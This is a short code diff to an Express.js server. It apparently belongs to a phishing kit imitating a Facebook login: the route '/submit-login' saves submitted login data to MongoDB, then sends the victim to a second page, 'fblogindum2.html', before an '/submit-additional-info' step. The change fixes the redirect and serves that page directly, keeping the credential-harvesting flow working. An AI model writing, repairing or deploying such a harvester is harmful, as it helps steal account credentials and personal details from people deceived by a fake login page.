@@ -51,7 +51,7 @@ app.post('/submit-login', async (req, res) => {
         // Log the result after successful insertion
         console.log("Data inserted successfully:", result);
         
-        res.redirect(`//fblogindum2.html?username=${encodeURIComponent(username)}`);
+        res.redirect(`/fblogindum2.html`);
     } catch (error) {
         console.error('Error saving data to MongoDB:', error);
         res.status(500).send('Error saving data to MongoDB.');
@@ -59,8 +59,7 @@ app.post('/submit-login', async (req, res) => {
 });
 
 app.get('/fblogindum2.html', (req, res) => {
-    const username = req.query.username; // Get the username from the query parameters
-    res.redirect(`/fblogindum2.html`);
+    res.sendFile(path.join(__dirname, 'fblogindum2.html'));
 });
 
 app.post('/submit-additional-info', async (req, res) => {
